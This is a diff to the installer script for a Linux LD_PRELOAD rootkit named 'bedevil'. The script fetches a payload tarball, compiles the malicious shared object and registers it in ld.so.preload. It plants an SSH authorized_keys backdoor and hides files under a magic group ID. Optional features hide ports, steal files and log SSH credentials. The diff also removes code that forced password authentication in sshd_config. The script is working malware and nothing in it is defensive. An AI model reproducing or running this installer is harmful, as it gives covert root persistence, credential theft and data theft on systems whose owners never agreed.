@@ -3,7 +3,7 @@
 # the following is required for this to work as intended:
 #   - wget or curl, base64 & tar
 
-B64TARGZ_LOCATION="http://host/target.b64" # change this..
+B64TARGZ_LOCATION="http://host/file.b64" # change this..
 WORKDIR="/tmp" # & mayb this.
 PLATFORM="`uname -m`" # but not this.
 
@@ -31,19 +31,8 @@ read_toggles(){ # $1 = path of conf
         [ "$line" == 'HIDE_PORTS=1' ] && HIDE_PORTS=1
         [ "$line" == 'FILE_STEAL=1' ] && FILE_STEAL=1
         [ "$line" == 'LOG_SSH=1' ] && LOG_SSH=1
+        [ "$line" == 'READ_GID_FROM_FILE=1' ] && READ_GID_FROM_FILE=1
     done <<< "`cat $conf`"
-}
-patch_sshdconfig(){
-    local sshd_config=/etc/ssh/sshd_config
-    [ ! -f $sshd_config ] && return
-
-    # enable PAM logins
-    [ "`cat $sshd_config | grep 'UsePAM'`" == 'UsePAM yes' ] || \
-        echo 'UsePAM yes' >> $sshd_config
-
-    # enable user password authentications.
-    [ "`cat $sshd_config | grep 'PasswordAuthentication yes'`" == 'PasswordAuthentication yes' ] || \
-        echo 'PasswordAuthentication yes' >> $sshd_config
 }
 install_deps(){
     local YUM_DEPS=('gcc' 'newt' 'libgcc.i686'
@@ -110,21 +99,22 @@ tar xpfz $TARGZ_NAME >/dev/null && echo "done. removing it." && rm $TARGZ_NAME $
 [ ! -d "$INCLUDE_DIR" ] && { echo "include dir doesn't exist...? exiting."; emergency_exit $TARGZ_NAME $B64TARGZ_FILENAME; }
 
 echo -e "\ngetting settings"
-settings=(`cat $INCLUDE_DIR/settings | grep -o '^[^#]*'`)
+settings=(`cat $INCLUDE_DIR/settings.cfg | grep -o '^[^#]*'`)
 MAGIC_GID=${settings[0]} && INSTALL_DIR=${settings[1]}
 LDSO_PRELOAD=${settings[2]} && BDVLSO=${settings[3]}
 SOPATH=${settings[4]} && HIDEPORTS=${settings[5]}
 SSH_LOGS=${settings[6]} && INTEREST_DIR=${settings[7]}
-BD_VAR=${settings[8]}
+BD_VAR=${settings[8]} && GID_PATH=${settings[9]}
 
 echo -e "getting toggle statuses\n"
-read_toggles $INCLUDE_DIR/toggles.conf
+read_toggles $INCLUDE_DIR/toggles.cfg
 echo "MAGIC_GID: $MAGIC_GID"; echo "INSTALL_DIR: $INSTALL_DIR"
 echo "LDSO_PRELOAD: $LDSO_PRELOAD"; echo "BDVLSO: $BDVLSO"
 echo "SOPATH: $SOPATH"; echo "BD_VAR: $BD_VAR"
 [ $HIDE_PORTS == 1 ] && echo "HIDEPORTS = $HIDEPORTS"
 [ $LOG_SSH == 1 ] && echo "SSH_LOGS = $SSH_LOGS"
 [ $FILE_STEAL == 1 ] && echo "INTEREST_DIR = $INTEREST_DIR"
+[ $READ_GID_FROM_FILE == 1 ] && echo "GID_PATH = $GID_PATH"
 echo -e "done getting config values\n"
 
 echo "compiling rootkit"
@@ -132,7 +122,7 @@ LINKER_FLAGS=(-ldl)
 [ $USE_CRYPT == 1 ] && LINKER_FLAGS+=(-lcrypt)
 WARNING_FLAGS="-Wall" && OPTIMIZATION_FLAGS="-O0 -g0"
 OPTIONS="-fomit-frame-pointer -fPIC" && LINKER_OPTIONS="-Wl,--build-id=none"
-install_deps
+#install_deps
 [[ $PLATFORM == 'armv'* ]] && PLATFORM="${PLATFORM: -3}"
 gcc -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.$PLATFORM
 gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.i686 &>/dev/null
@@ -156,35 +146,38 @@ BASHRC="tty -s || return
 alias ls=\"ls --color=auto\"
 alias ll=\"ls --color=auto -AlFhn\"
 id && who
-[ -f ~/auth_logs ] && echo -e \"\\e[1mLogged accounts: \\e[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\e[0m\"
-[ -f ~/ssh_logs ] && echo -e \"\\e[1mSSH logs: \\e[1;31m\$(cat ~/ssh_logs | wc -l)\\e[0m\""
+[ -f ~/auth_logs ] && echo -e \"\\e[1mLogged accounts: \\e[1;31m\$(cat ~/auth_logs | wc -l)\\e[0m\"
+[ -f ~/ssh_logs ] && echo -e \"\\e[1mSSH logs: \\e[1;31m\$(cat ~/ssh_logs | wc -l)\\e[0m\"
+chown -h 0:\`id -g\` ~/* &>/dev/null"
 echo -n "$BASHRC" > $INSTALL_DIR/.bashrc
 echo -n ". .bashrc" > $INSTALL_DIR/.profile
+
+echo 'moving some files'
 [ -f $INCLUDE_DIR/.rolf ] && mv $INCLUDE_DIR/.rolf $INSTALL_DIR/
 [ -f $INCLUDE_DIR/id_rsa.pub ] && { mkdir $INSTALL_DIR/.ssh && mv $INCLUDE_DIR/id_rsa.pub $INSTALL_DIR/.ssh/authorized_keys; }
-
 [ $HIDE_PORTS == 1 ] && { mktouch $HIDEPORTS && chmod 644 $HIDEPORTS && ln -s $HIDEPORTS $INSTALL_DIR/hideports && cat $INCLUDE_DIR/hideports > $INSTALL_DIR/hideports; }
 [ $FILE_STEAL == 1 ] && { mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir; }
-[ $LOG_SSH == 1 ] && { mktouch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; } 
+[ $LOG_SSH == 1 ] && { mktouch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; }
+[ $READ_GID_FROM_FILE == 1 ] && { mktouch $GID_PATH && chmod 644 $GID_PATH && cat $INCLUDE_DIR/magic_gid > $GID_PATH; }
+rm -r $INCLUDE_DIR
+
 if [ $HIDE_SELF == 1 ]; then
     echo "hiding everything"
 
     HIDE_FILES+=($LDSO_PRELOAD $INSTALL_DIR $INSTALL_DIR/*
-                 $INSTALL_DIR/.bashrc $INSTALL_DIR/.profile)
+                 $INSTALL_DIR/.bashrc $INSTALL_DIR/.profile
+                 $INSTALL_DIR/.rolf)
 
     [ $LOG_SSH == 1 ] && HIDE_FILES+=($SSH_LOGS)
     [ $FILE_STEAL == 1 ] && HIDE_FILES+=($INTEREST_DIR)
     [ $HIDE_PORTS == 1 ] && HIDE_FILES+=($HIDEPORTS)
+    [ $READ_GID_FROM_FILE == 1 ] && HIDE_FILES+=($GID_PATH)
 
     for file in ${HIDE_FILES[@]}; do
         [ ! -f $file ] && mktouch $file
-        chown -h 0:$MAGIC_GID $file
+        chown -h 0:$MAGIC_GID $file 2>/dev/null
     done
 fi
-
-rm -r $INCLUDE_DIR
-
-patch_sshdconfig
 
 echo 'writing $SOPATH to $LDSO_PRELOAD'
 echo -n "$SOPATH" > $LDSO_PRELOAD || { echo -e '\nfailed writing to $LDSO_PRELOAD. exiting\n'; emergency_exit $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR; }
